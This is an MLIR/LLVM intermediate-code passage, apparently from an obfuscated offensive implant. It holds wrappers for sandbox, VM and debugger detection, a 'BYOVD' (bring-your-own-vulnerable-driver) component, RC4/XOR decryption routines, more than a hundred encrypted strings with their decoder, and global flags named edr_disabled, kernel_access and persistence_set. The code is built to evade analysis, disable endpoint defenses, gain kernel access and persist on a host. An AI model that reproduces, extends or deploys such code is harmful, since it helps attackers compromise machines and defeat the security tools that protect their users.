    llvm.call @jocky_decrypt_rc4(%arg0, %arg1, %arg2, %arg3) : (!llvm.ptr, i32, !llvm.ptr, i32) -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_jocky_decrypt_xor(%arg0: !llvm.ptr, %arg1: i32, %arg2: i8, %arg3: i32) {
    llvm.call @jocky_decrypt_xor(%arg0, %arg1, %arg2, %arg3) : (!llvm.ptr, i32, i8, i32) -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_jocky_sleep_and_recheck() {
    llvm.call @jocky_sleep_and_recheck() : () -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_jocky_is_sandbox() -> i1 {
    %0 = llvm.call @jocky_is_sandbox() : () -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_is_vm() -> i1 {
    %0 = llvm.call @jocky_is_vm() : () -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_is_debugger_present() -> i1 {
    %0 = llvm.call @jocky_is_debugger_present() : () -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_check_analysis_environment() -> i32 {
    %0 = llvm.call @jocky_check_analysis_environment() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_runtime_init() -> i32 {
    %0 = llvm.call @jocky_runtime_init() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_byovd_destroy(%arg0: !llvm.ptr) {
    llvm.call @jocky_byovd_destroy(%arg0) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_jocky_byovd_new() -> !llvm.ptr {
    %0 = llvm.call @jocky_byovd_new() : () -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_jocky_free(%arg0: !llvm.ptr) {
    llvm.call @jocky_free(%arg0) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_jocky_alloc(%arg0: i64) -> !llvm.ptr {
    %0 = llvm.call @jocky_alloc(%arg0) : (i64) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_array_append(%arg0: !llvm.ptr, %arg1: !llvm.ptr) -> !llvm.ptr {
    %0 = llvm.call @array_append(%arg0, %arg1) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_array_len(%arg0: !llvm.ptr) -> i64 {
    %0 = llvm.call @array_len(%arg0) : (!llvm.ptr) -> i64
    llvm.return %0 : i64
  }
  llvm.func internal @__obfs_wrap_exit(%arg0: i32) {
    llvm.call @exit(%arg0) : (i32) -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_strlen(%arg0: !llvm.ptr) -> i64 {
    %0 = llvm.call @strlen(%arg0) : (!llvm.ptr) -> i64
    llvm.return %0 : i64
  }
  llvm.func internal @__obfs_wrap_memcpy(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: i64) -> !llvm.ptr {
    %0 = llvm.call @memcpy(%arg0, %arg1, %arg2) : (!llvm.ptr, !llvm.ptr, i64) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_memset(%arg0: !llvm.ptr, %arg1: i32, %arg2: i64) -> !llvm.ptr {
    %0 = llvm.call @memset(%arg0, %arg1, %arg2) : (!llvm.ptr, i32, i64) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_free(%arg0: !llvm.ptr) {
    llvm.call @free(%arg0) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_malloc(%arg0: i64) -> !llvm.ptr {
    %0 = llvm.call @malloc(%arg0) : (i64) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_jocky_str_concat(%arg0: !llvm.ptr, %arg1: !llvm.ptr) -> !llvm.ptr {
    %0 = llvm.call @jocky_str_concat(%arg0, %arg1) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_string(%arg0: i64) -> !llvm.ptr {
    %0 = llvm.call @string(%arg0) : (i64) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_println(%arg0: !llvm.ptr) {
    llvm.call @println(%arg0) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_puts(%arg0: !llvm.ptr) -> i32 {
    %0 = llvm.call @puts(%arg0) : (!llvm.ptr) -> i32
    llvm.return %0 : i32
  }
  llvm.mlir.global private unnamed_addr constant @__obfs_key("default_key") {addr_space = 0 : i32}
  llvm.func @f_658275b5bcb4(%arg0: !llvm.ptr, %arg1: i64) -> !llvm.ptr attributes {sym_visibility = "private"} {
    %0 = llvm.mlir.constant(0 : i64) : i64
    %1 = llvm.mlir.constant(1 : i64) : i64
    %2 = llvm.mlir.constant(77 : i8) : i8
    %3 = llvm.alloca %1 x i64 : (i64) -> !llvm.ptr
    llvm.store %0, %3 : i64, !llvm.ptr
    llvm.br ^bb1
  ^bb1:  // 2 preds: ^bb0, ^bb2
    %4 = llvm.load %3 : !llvm.ptr -> i64
    %5 = llvm.icmp "slt" %4, %arg1 : i64
    llvm.cond_br %5, ^bb2, ^bb3
  ^bb2:  // pred: ^bb1
    %6 = llvm.load %3 : !llvm.ptr -> i64
    %7 = llvm.getelementptr %arg0[%6] : (!llvm.ptr, i64) -> !llvm.ptr, i8
    %8 = llvm.load %7 : !llvm.ptr -> i8
    %9 = llvm.trunc %6 : i64 to i8
    %10 = llvm.sub %8, %9 : i8
    %11 = llvm.xor %10, %2 : i8
    llvm.store %11, %7 : i8, !llvm.ptr
    %12 = llvm.add %6, %1 : i64
    llvm.store %12, %3 : i64, !llvm.ptr
    llvm.br ^bb1
  ^bb3:  // pred: ^bb1
    llvm.return %arg0 : !llvm.ptr
  }
  llvm.mlir.global private @".str.0.enc"("r\0Dt\11TFF\1A[\13\FE\E6\1C\7FV?P@\1FPX\FBzEQ\E7W:<\04)$:\EA\E2\F9\FD\E7S;\09%(6\0C\000\0C\E1\12") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.1.enc"("\09\0B\09\11o\1Db+zT@'SQW;\11Ne'Y:+Z'\E7\0F\E4<\13+; ! +\10") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.2.enc"("\09\0B\09\11o\07b+zT@'SQW;\11KhP'B\E71\226-/15") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.3.enc"("\09\0B\09\11o\1Db+Hl\0EPQ WH%Md\EB\11\FB&%Y0-84\1F#\E96-\22)><$\12*") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.4.enc"("\09\0B\09\11o\1Db+MPTP^I\22\09UM\14P'7Z%\E3\18\F2+?`6== )\16") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.5.enc"("\09\0B\09\11o\07b+{G]\1CPW-NSFeW\04") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.6.enc"("\09\0B\09\11o\07b+{wP\1C__NESI\1FR7\FB[^0$<P0\19\00") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.7.enc"("\09\0B\09\11o\07b+a}\0E]]HNKPKg:\E4G^0\22)N/15") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.8.enc"("\09\0B\09\11o\07b+cHTKrWN=T$ *%OS#\22&55\FD\19)854&-,\07") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.9.enc"("\09\0B\09\11o\07b+IHTPK!-\09uMbPRGZ3\E3%KP!\1A6\E90!\05)23\22$*") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.10.enc"("\09\0B\09\11o\07b+`Gjhh\1C'GYGkRYG\07") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.11.enc"("\09\0B\09\11o\07b+eT0JQH\ED\FB\11=jSSNXZ'\07") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.12.enc"("\09\0B\09\11o\07b+zH0W_ \1A8(;\1FTPO0\E1&]3&I\1A,\09") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.13.enc"("\09\0B\09\11o\07b+{G]\1C,*Q?XNe9\E4+&5 _7(\1D") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.14.enc"("ZYVIS/K5[[K<") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.15.enc"("\09\0B\09\11o\07b+N-U]Q--\09_ImP\E4*7\\\\%7(\1D") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.16.enc"("\09\0B\09\11o\07b+fHJPQV\1AO#Gm\EB)*Z3^Z6/\FD\09+$8;\0A") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.17.enc"("r\02t\11ybQ+{!O-UIP\F3\11\F9\D1\EB(D Y]\\#?0\04\E0-1:&#98#\00") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.18.enc"(dense<77> : tensor<1xi8>) {addr_space = 0 : i32} : !llvm.array<1 x i8>
  llvm.mlir.global private @".str.19.enc"("r\0Dt\11TFF\1A[\13\FF\E6\1C}\EC\09sGk'771&3\07") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.20.enc"("A_]!\0E\0B\1CwAROHTI-=\EB\F2\D4\E7\F7\0E&1Z\1A=QK\17),\14") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.21.enc"("\09\0B\09\11o\07b+NMwo}JC\09r\E4 9Y*7\\]#7(\1D") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.22.enc"("\09\0B\09\11o\09b+xPRH^_]@\11>k\EB\\81% Z6/1\D5'$:(#+\10") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.23.enc"("kLH#Y(l\1EGIJI#-A9#Gd '7^\\]J \F8\1D") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.24.enc"("j\1Du|]D[v)\22b@QK*U\1FLk*_0LR\\#7P\1D") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.25.enc"("r\0Dt\11TFF\1A[\13\F0\E6\1CkQMTF wS6]]\\$6\E4\F3\D5G.7\22# /\07") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.26.enc"("\09\0B\09\11o\07b+cNJWH\1C]NRBeW\EE\FB\07") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.27.enc"("\09UP]Y/'") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.28.enc"("\09\0B\09\11o\00b+zN=JHI[MX@c\EBQN[Z_\E706Jb\E0\09") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.29.enc"("A_]!\0E\0B\1CwAROHTI-=\EB\F1\D0\FB\F4\0ER\\' N5\1D") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.30.enc"("\06+") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.31.enc"("YC@\02\F7\09Rt@H\13\E0W\0BSG\22>\0E '7\1D$$00\04") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.32.enc"("\09\0B\09\11o\07b+cNJWH\1CVD&@l^%GZ%\E33I\E4\1D") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.33.enc"("\09\0B\09\11o\09b+cNJWH\1CVD&@l^%G\E7'\22\\N/1\D5\E8'; \E77\02<3?\09>.\F6\1D") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.34.enc"("r\0Dt\11TFF\1A[\13\F1\E6\1Cp[=P\0AD\\7:\\7&9;\E4\F3\D5I'\22- :'\116\00") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.35.enc"("\09\0B\09\11o\07b+xN;JP\E2\1A)") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.36.enc"("r\02t\11xE0jA!K.QP\1A)") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.37.enc"("\09OH]E\1EKl,VK /<") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.38.enc"("r\0Dt\11TFF\1A[\13\FA\E6\1Cp[=P\0A\7F^POZ 7\\IR\FD\DD\F2\E9G'?\0438\08\FF*") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.39.enc"("j\1Duz7A1\1ArC;^HW]UuG\13]PN&%0\07") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.40.enc"("\09\0B\09\11o\07b+zN=JHI[M\22\FC \0B") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.41.enc"("j\1Duz7A1\1ArC;^HW]UuG\1F QD]50\07") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.42.enc"("\09\0B\09\11o\07b+zNA'ISP=\22\FC \0B") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.43.enc"("j\1Duz7A1\1ArC;^HW]UuM\0FR(N7\01") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.44.enc"("\09\0B\09\11o\07b+zT1U I*\F3\11*") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.45.enc"("\09\0B\09\11o\07b+Mps\1C.SYF\22>\0E,\E4G*R3 6\04") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.46.enc"("\09\0B\09\11o\07b+bBo\1C/S];T>\0F\EBX4R1&#\12") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.47.enc"("\09\0B\09\11o\07b+}-KPQV&FPF\0F\EBYA*R&9380\19\00") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.48.enc"("r\02t\11x]Kl\1ErUHHS]=XGj\E1\E4\1B") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.49.enc"("\09UP]Y/\07m,NS\1C\E2\1C-D$$\1FP7\1B") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.50.enc"("r\0Dt\11TFF\1A[\13\FB\E6\1Cp[=P\0AE]'-.17\\IR\FD\D7\E0B:+!*)=<\00") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.51.enc"("\09\0B\09\11o\07b+vnP\1CQV];(:\14\\SA\E7&37NS0\19\00") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.52.enc"("BLP\1E\F6\EF'") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.53.enc"("\09\0B\09\11o\07b+Lr\FA\1CQV];(:\14\\SA\E7&37NS0\19\00") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.54.enc"("\09\0B\09\11o\07b+zP:S\1C]QZ!$e:7D[\01") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.55.enc"("\09\0B\09\11o\07b+|P1W\E2\E0\1AB_KkWYG\E9\E1\03") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.56.enc"("r\0Dt\11TFF\1A[\13\FC\E6\1Cs\22OXF\149%7^\\]\E7\0A\FF\FDt(.: /\22\03\FC\1F") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.57.enc"("\09\0B\09\11o\1Db+`N\0EP] [\09%G P,9^]793805") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.58.enc"("A_]!\0E\0B\1CwAROHTI-=\EB\F1\D0\FB\F4\0E*1_Z3(\1D") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.59.enc"("yfF}$") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.60.enc"("\09\0B\09\11o\07b+}wt\1CQ$XF]>\0ET(@\\_\E36'%>\1A782=&\16") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.61.enc"("\09\0B\09\11o\07b+ziQ\1C #PGTF P,9^]79384`*\E9'=57-\16\08&?!\12") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.62.enc"("\09\0B\09\11o\07b+zH1]K*V\09T2b\\P71&7\\IR\FD\04=(7-\05\07.(+\00") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.63.enc"("\09\0B\09\11o\07b+yH:t!Z\1AB)Hi_(-&5ZZH\E4.\0A'(1;\05(=3\1F") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.64.enc"("cfvhm>") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.65.enc"("\09\0B\09\11o\07b+JTRWS*[Z\11M\18U]O+3\223KQK\D5727+/\07\03%2<*") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.66.enc"("r\02t\11qQS\1FG\0CAT]VPB]\0Ae#Z@S51$&SJ\1F\E0(;%:\22-+\22\00") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.67.enc"("r\0Dt\11TFF\1A[\13\FD\E6\1CzCdGn w6@5Z1\E7],<\1E*\E9\FC\F1\EAJ\02<\0D;8\0C\EB\01") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.68.enc"("[_NFSS\F6\DBV\E1\FA\0A/'-)") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.69.enc"("uw\03uVr`v,T\FC\E0<") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.70.enc"("\09\0B\09\11o\07b+|xuBp\1CV;X8e9\E4O\\&' 6\E4\08\D5/\22& /\22\F0$8!\0F\0C\0D\E1*9\01:!8.\03\EA") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.71.enc"("r\04t\11fu|}z\13AT]WP\09T2hT)*+Z'\E7\0ARJ\1F\15(&!>!3$+\FF*") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.72.enc"("r\0Dt\11TFF\1A[\13\06\E6\1CL,DRM\0F:\E4`][&&&SJ\1F\E0\E1\E7\EAG-<?$$9\E6\12") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.73.enc"("\09\0B\09\11o\07b+N-U]Q--\09X@fP'7^\\]\E7O/!\1D+-'\EA+81<+'\08!7\01") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.74.enc"("r\0Dt\11TFF\1A[\13\07\E6\1CLW;\22A\0F'YA Z\E3\E5\F2V0\18)8 \043\F6\E8\D5\FFS\0F\09*41\0E\F4\1D") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.75.enc"("\09\0B\09\11o\07b+NT0-U-&B_Ke\EBQD Y\22]K5H\04\E0-1:&#98#\00") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.76.enc"("\09\0B\09\11o\07b+\7FLaS_TW\09!I\14*\\D[\01") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.77.enc"("\09\0B\09\11o\07b+MKWO\7F_]AT\0A\10T(:_Z'\07") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.78.enc"("zFK]K]1prlW].I-DW>|F]A[\\46^E \036\22:>X-\02\16&=\14QW\19\0D+6\0F-\1C7\1D\182\09\11\05\1E\C65\08*$\0C\1A\D7 \17\0D\0C\01\EC\F2\C9") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.79.enc"("\09\0B\09\11o\07b+|-U!/S,\09T2\14PR*^\\]\E7\22//\04)8 - 7-\E7&>9\0935)01\1D") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.80.enc"("r\0Dt\11TFF\1A[\13\FF\EC\E6\1C{G%A-uS-Z_0\\=5\FD\DD\F1\F1\F4^/7(=&\17?:\0D\F6\1D") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.81.enc"("zLVZ6EKd>") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.82.enc"("zP&]YI'") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.83.enc"("h[YE]_F\1FGNT<") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.84.enc"("\09\0B\09\11o\07b+{!KJ \1CNDV; *PD&3&#\12") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.85.enc"("\09\0B\09\11o\07b+KBt\1CvI';_Il\EB'OZ&1 6\04") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.86.enc"("\09\0B\09\11o\07b+MM[o\1C]NBP$eW\04") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.87.enc"("\09\0B\09\11o\07b+NN=W.MRB]F S]*+\\1,\F294\05--\14") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.88.enc"("\09\0B\09\11o\07b+}lj\1CTW-=^$\19\EB+@7Z'\07") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.89.enc"("\09\0B\09\11o\07b+N-KRQ ]A\11?i;YG\07") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.90.enc"("\09\0B\09\11o\07b+d$S,\1CHS8%; &]+Z%\03") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.91.enc"("\09\0B\09\11o\07b+JK;O^V[F]\0A\1FT'CZ\E14\\\22/15") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.92.enc"("\09\0B\09\11o\07b+LTAWJ \1AOXFe:\E4:SZ\2297(\1D") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.93.enc"("\09\0B\09\11o\07b+cqZ\1C WOB\22>aX4*\E7 _ 360\19\00") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.94.enc"("JC'DQA'") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.95.enc"("\09\0B\09\11o\07b+}K0IIS\1AHPKhP\E4:SZ\2297(\1D") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.96.enc"("O@'JZKO\0B") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.97.enc"("\09\0B\09\11o\07b+xH0WRI\22\09RI\1FSY\FB ]&$,/15") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.98.enc"("\09\0B\09\11o\07b+}K0IIS\1AAX;\14^60\E7 _ 360\19\00") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.99.enc"("\09\0B\09\11o\07b+xH0WRI\22\09YA\0F'S-.\E1 [7+/\1A,\09") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.100.enc"("j\1Du|]D[v)\22b@QK*)") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.101.enc"("j\1Du}YI7\0B") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.102.enc"("\09\0B\09\11o\07b+JTS,\1C^SET; &]+Z%\03") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.103.enc"("\09\0B\09\11o\07b+\7FM^\1C__]AT\0Ab_)*_Z'\07") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.104.enc"("\09\0B\09\11o\07b+ziQ\1C__]AT\0A\1F_Y81Z'\07") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.105.enc"("j\1Duz7A1\1A>") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.106.enc"("\09\0B\09\11o\07b+K\22K.\1C_,=XHa*(*\E74Z77(\1D") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.107.enc"("r\02t\11eDKt\03QU.QV-FR; *SL7]&37\FE\FD\C6\F8\E97&/)&(\0F\E0>:=)+4\0C\06-\03\EB\037\17.=\09\07\02\FD") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.108.enc"("r\0Dt\11TFF\1A[\13\FF\E3\E6\1CMB]H-wYOZ5ZZH\E4M\03+=;+!\22\10") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.109.enc"("\09\0B\09\11o\00b+gIW U_&F_O :YO%\12' N/!\1E+'\FA\E0\E0\16") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.110.enc"("r\02t\11fE]l,X\0E.QKQ?TN U6NR\E1'\\--\1D") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.111.enc"("\CB\BC\BD\D3\A9\8E\C1\80\8E\DD\9B\8C\DE\83\8A\CB\84\9A\9E\80\94\BD\8A\91\A1\90\82\A6\80\A5\A6\92\84\B4\9Ff\B2\88o\A2_m\BCzm\B9`m\AAe{\BDgw\9Ckp\8Esm\87aD\85}g\95~G\95kH\83~L\9F]N\98ALuFD\\FV\7FTSoRL`Bcd\\FvY$tJ)l\1D#~</{./T'%{%1^52L5/A#\02[?\19W8\05W\15\0AM<\02Y\1F\08Z\0F\0E7\00\06\1A\04\101\16\1D-\14\0E\22\0C!:\1E\F80\1B\E26\F4\EB.\DB\E18\FE\E9\05\EC\F1\16\E1\E79\FB\F6~") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.112.enc"("\CB\BC\B8\11~k`Rw\13]KJPQ<\22\0Ap9SG* 7\\IR\FD\07\FC\E9\F9\EAH=$3\FFA\0B\0D3#4+4\09\11\F2\EB\FF\CA\C7\DA\C0\C0\C0\C6\DD\C5\DE\B2|y\F7") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.113.enc"("\CB\BC\B8\11\09\EE\18+L$T UKW\09pZI:\E4?\E7@\\X\22P0\09-\E9QN$\F6M\15>\11\13 (\E19\FF\\\06\1C?\E6\1E>8\1B>\15\10\C6\DD\C5\98Ip\E8") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.114.enc"("\CB\BC\BF\D3\A9\8E\C1\80\8E\DD\9B\8C\DE\83\8A\CB\84\9A\9E\80\94\BD\8A\91\A1\90\82\A6\80\A5\A6\92\84\B4\9Ff\B2\88o\A2_m\BCzm\B9`m\AAe{\BDgw\9Ckp\8Esm\87aD\85}g\95~G\95kH\83~L\9F]N\98ALuFD\\FV\7FTSoRL`Bcd\\FvY$tJ)l\1D#~</{./T'%{%1^52L5/A#\02[?\19W8\05W\15\0AM<\02Y\1F\08Z\0F\0E7\00\06\1A\04\101\16\1D-\14\0E\22\0C!:\1E\F80\1B\E26\F4\EB.\DB\E18\FE\E9\05\EC\F1\16\E1\E79\FB\EC~") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.115.enc"("r\0Dt\11fQ^wZ\E5\0E<") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.116.enc"("cfvhm{TT`wuAOyJ[~nuJH`|\7FLU\E6ASjtE\14") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.117.enc"("r\0Dt\11eN~\1A\1ED1WP\E2\1A\F2\E1\03 T'-\\00\E7\E3\FB\FD\05(.'-\05\16") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.118.enc"("r\02t\11yVZj+'WIJ\1C]D\\:lP(D\07") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.119.enc"("r\0Dt\11yVEtB'0S SV\F3\11*") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.120.enc"("r\0Dt\11ybQ+|X>S/-WM\EB\0A\00") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.121.enc"("r\0Dt\11\7FA1u[O\0Es_]W8\22\FC \0B") {addr_space = 0 : i32}
  llvm.mlir.global private @".str.122.enc"("r\0Dt\11TA1\1AG\22:WJ]W\F3\11*") {addr_space = 0 : i32}
  llvm.mlir.global external @g_40a54151() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @g_d122d020() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @g_9db24be5() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @g_95bd4817() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @g_b7bfea9b() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @g_e836b4e8() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @g_fa0366c2() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @g_3cddc28a() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @g_9f9def0f() {addr_space = 0 : i32} : !llvm.array<6 x ptr> {
    %0 = llvm.mlir.zero : !llvm.ptr
    %1 = llvm.mlir.undef : !llvm.array<6 x ptr>
    %2 = llvm.insertvalue %0, %1[0] : !llvm.array<6 x ptr> 
    %3 = llvm.insertvalue %0, %2[1] : !llvm.array<6 x ptr> 
    %4 = llvm.insertvalue %0, %3[2] : !llvm.array<6 x ptr> 
    %5 = llvm.insertvalue %0, %4[3] : !llvm.array<6 x ptr> 
    %6 = llvm.insertvalue %0, %5[4] : !llvm.array<6 x ptr> 
    %7 = llvm.insertvalue %0, %6[5] : !llvm.array<6 x ptr> 
    llvm.return %7 : !llvm.array<6 x ptr>
  }
  llvm.mlir.global external @g_7bfb2ead() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @g_743afcdf() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @g_e47349ba() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @edr_disabled(false) {addr_space = 0 : i32} : i1
  llvm.mlir.global external @kernel_access(false) {addr_space = 0 : i32} : i1
  llvm.mlir.global external @persistence_set(false) {addr_space = 0 : i32} : i1
  llvm.func @puts(!llvm.ptr) -> i32
  llvm.func @printf(!llvm.ptr, ...) -> i32
  llvm.func @println(!llvm.ptr)
  llvm.func @string(i64) -> !llvm.ptr
  llvm.func @jocky_str_concat(!llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @malloc(i64) -> !llvm.ptr
  llvm.func @free(!llvm.ptr)
